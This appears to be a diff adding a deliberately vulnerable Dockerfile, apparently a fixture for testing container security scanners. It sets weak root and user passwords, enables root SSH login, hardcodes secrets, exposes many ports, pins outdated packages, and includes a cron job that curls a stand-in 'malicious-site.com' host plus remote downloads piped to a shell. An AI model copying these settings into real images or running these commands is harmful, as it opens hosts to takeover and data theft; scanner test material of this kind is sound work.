@@ -1,0 +1,91 @@
+# Vulnerable Dockerfile with multiple security issues
+# Using outdated base image with known vulnerabilities
+FROM node:14
+
+# Running as root user (security risk)
+# No USER directive to switch to non-root user
+
+# Set working directory as root
+WORKDIR /app
+
+# Copy everything without proper ownership
+COPY . .
+
+# Install packages as root with additional vulnerabilities
+RUN apt-get update && \
+    apt-get install -y \
+    curl \
+    wget \
+    vim \
+    sudo \
+    ssh \
+    telnet \
+    ftp \
+    netcat \
+    nmap \
+    python2 \
+    python2-dev \
+    && rm -rf /var/lib/apt/lists/*
+
+# Install npm packages with security issues
+RUN npm install -g nodemon@1.19.1 && \
+    npm install express@4.16.1 && \
+    npm install lodash@4.17.11 && \
+    npm install jquery@3.3.1 && \
+    npm install bootstrap@3.3.7
+
+# Add insecure configurations
+RUN echo "root:password" | chpasswd && \
+    echo "PermitRootLogin yes" >> /etc/ssh/sshd_config && \
+    echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
+
+# Expose unnecessary ports
+EXPOSE 22 23 21 3389 5432 3306 6379 27017
+
+# Set insecure environment variables with hardcoded secrets
+ENV DB_PASSWORD=admin123
+ENV API_KEY=sk-1234567890abcdef
+ENV JWT_SECRET=supersecret
+ENV DEBUG=true
+ENV NODE_ENV=development
+ENV DISABLE_SSL=true
+
+# Add vulnerable packages
+RUN npm install -g \
+    express@3.21.2 \
+    ejs@2.6.1 \
+    handlebars@4.1.0 \
+    morgan@1.9.0 \
+    body-parser@1.18.3
+
+# Create files with wrong permissions
+RUN touch /app/secrets.txt && \
+    echo "database_password=admin123" > /app/secrets.txt && \
+    echo "api_key=sk-1234567890" >> /app/secrets.txt && \
+    chmod 777 /app/secrets.txt
+
+# Add user with weak password
+RUN useradd -m -s /bin/bash vulnerable && \
+    echo "vulnerable:password" | chpasswd && \
+    usermod -aG sudo vulnerable
+
+# Install additional vulnerable software
+RUN wget -O /tmp/vulnerable.tar.gz http://example.com/vulnerable-package.tar.gz && \
+    tar -xzf /tmp/vulnerable.tar.gz -C /opt/ && \
+    chmod +x /opt/vulnerable-package/run.sh
+
+# Set up insecure cron jobs
+RUN echo "*/5 * * * * curl http://malicious-site.com/collect-data" > /etc/crontab
+
+# Download and execute scripts from internet
+RUN curl -sSL https://get.docker.com/ | sh
+
+# No health check
+# HEALTHCHECK instruction missing
+
+# Run as root with privileged operations
+CMD ["bash", "-c", "service ssh start && npm start"]
+
+# Missing security labels and metadata
+LABEL version="1.0.0"
+LABEL description="Vulnerable application for testing"
